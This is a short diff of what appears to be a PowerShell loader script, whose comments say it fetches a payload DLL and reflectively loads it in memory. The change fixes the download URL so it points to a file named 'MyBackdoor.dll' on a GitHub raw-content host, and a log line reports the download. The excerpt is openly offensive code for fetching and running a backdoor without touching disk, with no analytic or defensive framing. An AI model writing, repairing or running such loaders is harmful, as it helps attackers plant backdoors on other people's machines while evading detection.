@@ -2,7 +2,7 @@
 # Fetches and reflectively loads payload.dll entirely in memory
 
 # 1) URL of your hosted payload DLL
-$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/blob/main/MyBackdoor.dl'
+$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/blob/main/MyBackdoor.dll'
 Write-Host "[+] Downloading payload from $payloadUrl"
 
 # 2) Download raw DLL bytes
